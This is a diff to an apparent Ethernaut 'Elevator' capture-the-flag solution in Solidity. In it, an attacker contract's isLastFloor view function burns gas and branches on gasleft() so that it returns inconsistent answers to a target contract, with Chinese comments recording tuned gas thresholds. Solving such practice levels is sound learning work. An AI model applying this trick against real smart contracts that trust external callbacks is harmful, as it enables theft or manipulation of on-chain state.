@@ -12,7 +12,7 @@ contract Building {
   
     Elevator ele;
     
-
+    uint256 public conut = 100000000;
     function initElev(address add) public{
 
         ele=Elevator(add);
@@ -21,10 +21,20 @@ contract Building {
     function attackGO() public returns (bool what){
 
               what = ele.goTo();
+              
+    }
+
+       function attackGO1() public returns (bool what){
+
+              what = ele.goTo();
+               conut =gasleft();
 
     }
+
+
     
-    function isLastFloor() public view returns (bool){
+    function isLastFloor() public  view returns (bool){
+           
             //使用奇偶判断 需要调试debug gas的剩余量
             // uint256  gas = gasleft();
             // console.log(gas);
@@ -35,15 +45,22 @@ contract Building {
             // return a; //使用奇偶
 
             // 使用gas 循环消耗 调用
-            //console.log(gasleft());
-            uint256 x=1;
-            if(gasleft()>1000){
+          
+            uint256 x=2;
+            uint256 y=2;
+            //conut =gasleft();
+            if(gasleft()>2881000){//本地2881000  2881173
 
               do{                
-                  //x= a*10;
+                  x= x**2;
+                  y=y**2;
                   uint256 aa=address(this).balance;
-                  //console.log(gasleft());
-              }while(gasleft()>1000);
+                  uint256 aa1=address(this).balance;
+                  uint256 aa2=address(this).balance;
+                  uint256 aa3=address(this).balance;
+                   
+                   //console.log(gasleft());//打印的话 gaslimit 可填写2970000
+              }while(gasleft()>2881000);
               
               return false;
             }
